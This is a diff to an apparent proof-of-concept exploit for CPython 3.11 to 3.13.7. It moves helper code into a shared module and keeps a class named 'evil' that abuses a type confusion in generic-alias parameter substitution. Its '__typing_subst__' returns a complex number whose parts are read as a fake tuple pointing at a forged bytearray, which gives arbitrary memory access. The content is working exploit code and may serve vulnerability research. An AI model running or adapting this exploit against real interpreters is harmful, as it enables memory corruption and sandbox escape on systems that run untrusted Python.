@@ -71,6 +71,10 @@ _Py_subs_parameters(PyObject *self, PyObject *args, PyObject *parameters, PyObje
 }
 """
 
+from common import evil_bytearray_obj, check_pyversion, i2f
+
+check_pyversion(introduced_ver=(3, 11, 0), patched_ver=(3, 13, 8))
+
 # so to exploit this, we can use the `complex` type which allows setting an arbitrary tuple size and
 # an arbitrary ob_item[0] when abusing type confusion bugs like this
 
@@ -78,21 +82,14 @@ class evil:
     __typing_is_unpacked_typevartuple__ = True
 
     def __typing_subst__(self, _unused):
-        i2f = lambda num: 5e-324 * num
         fake_ob_size = i2f(1) # set ob_size to 1 so it only extends the args with our fake ba obj
-        fake_ob_item = i2f(id(fake_ba) + bytes.__basicsize__ - 1) # will be interpreted as ob_item[0]
+        fake_ob_item = i2f(obj_addr) # will be interpreted as ob_item[0]
 
         # doing this is the same as `return complex(fake_ob_size, fake_ob_item)`
         return fake_ob_size + 1j * fake_ob_item
 
-p64 = lambda num: num.to_bytes(8, 'little')
-fake_ba = (
-    p64(0x12345) +
-    p64(id(bytearray)) +
-    p64(2**63 - 1) +
-    p64(2**63 - 1) +
-    p64(0) + p64(0)
-)
+# see ./common/common.py for evil bytearray obj explanation
+fake_obj, obj_addr = evil_bytearray_obj()
 
 mem = list[evil()]["anything"].__args__[0]
 
